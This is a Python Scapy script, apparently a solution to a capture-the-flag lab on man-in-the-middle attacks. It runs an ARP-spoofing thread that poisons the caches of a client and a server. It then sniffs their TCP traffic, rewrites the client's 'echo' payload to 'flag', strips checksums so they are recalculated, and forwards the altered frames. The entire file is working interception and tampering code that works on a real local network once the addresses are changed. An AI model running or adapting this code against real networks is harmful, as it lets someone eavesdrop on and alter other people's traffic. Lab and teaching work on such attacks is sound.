#!/usr/bin/env python3
# Intro to Cybersecurity / Intercepting Communication / Man-in-the-Middle
# the point is make sure packet chksum is recalculated after we modify the payload

import threading
import time

from scapy.all import (
    Raw,
    conf,
    get_if_hwaddr,
    sendp,
    sniff,
)
from scapy.layers.l2 import getmacbyip, Ether, ARP
from scapy.layers.inet import IP, TCP


# ---------------------------------------------------------
# Network Configuration
# ---------------------------------------------------------
CLIENT_IP = "10.0.0.2"
SERVER_IP = "10.0.0.3"

# Resolve MAC addresses
print("[*] Resolving MAC addresses...")
CLIENT_MAC = getmacbyip(CLIENT_IP)
SERVER_MAC = getmacbyip(SERVER_IP)
ATTACKER_MAC = get_if_hwaddr(conf.iface)
print(
    f"[*] Client MAC: {CLIENT_MAC} | Server MAC: {SERVER_MAC} | Attacker MAC: {ATTACKER_MAC}"
)


def arp_spoof():
    """
    Background thread logic to maintain the ARP spoofing state.
    Continuously poisons the ARP caches of both client and server.
    """
    while True:
        # Tell client that the server is at the attacker's MAC
        client_arp = Ether(dst=CLIENT_MAC) / ARP(
            op=2, psrc=SERVER_IP, pdst=CLIENT_IP, hwdst=CLIENT_MAC
        )
        sendp(client_arp, verbose=False)

        # Tell server that the client is at the attacker's MAC
        server_arp = Ether(dst=SERVER_MAC) / ARP(
            op=2, psrc=CLIENT_IP, pdst=SERVER_IP, hwdst=SERVER_MAC
        )
        sendp(server_arp, verbose=False)

        time.sleep(1)


def process_packet(pkt):
    """
    Callback function to process sniffed packets.
    Intercepts, modifies, and forwards TCP traffic between client and server.
    """
    # Prevent infinite loops by ignoring packets we just forwarded
    if pkt.haslayer(Ether) and pkt[Ether].src == ATTACKER_MAC:
        return

    # Only process IP and TCP layers
    if not pkt.haslayer(IP) or not pkt.haslayer(TCP):
        return

    ip_src = pkt[IP].src
    ip_dst = pkt[IP].dst

    # Ensure the packet belongs to the targeted session
    if (ip_src == CLIENT_IP and ip_dst == SERVER_IP) or (
        ip_src == SERVER_IP and ip_dst == CLIENT_IP
    ):
        # Isolate the L3/L4 packet (stripping Ethernet frame)
        new_pkt = pkt[IP].copy()

        del new_pkt[IP].chksum
        del new_pkt[TCP].chksum

        # Check if the packet is from client to server and has a payload
        if ip_src == CLIENT_IP and pkt.haslayer(Raw):
            payload = pkt[Raw].load
            print(f"[+] Client sent: {payload}")
            if payload == b"echo":
                print("[*] Intercepted 'echo', replacing with 'flag'")
                new_pkt[Raw].load = b"flag"

                # Delete lengths and checksums; Scapy recalculates them upon send
                del new_pkt[IP].len

        # Check if the packet is from server to client to catch the flag
        elif ip_src == SERVER_IP and pkt.haslayer(Raw):
            payload = pkt[Raw].load
            print(f"[+] Server response: {payload}")

        # Reconstruct Layer 2 frame pointing to the correct physical destination
        target_mac = SERVER_MAC if ip_dst == SERVER_IP else CLIENT_MAC
        eth_frame = Ether(src=ATTACKER_MAC, dst=target_mac) / new_pkt

        # Forward the packet
        sendp(eth_frame, verbose=False)


# Start the ARP spoofing process
threading.Thread(target=arp_spoof, daemon=True).start()

print("[*] Starting MITM attack. Waiting for authentication and packets...")
# Start sniffing only the relevant traffic to minimize processing overhead
sniff(filter=f"ip and (host {CLIENT_IP} or host {SERVER_IP})", prn=process_packet)
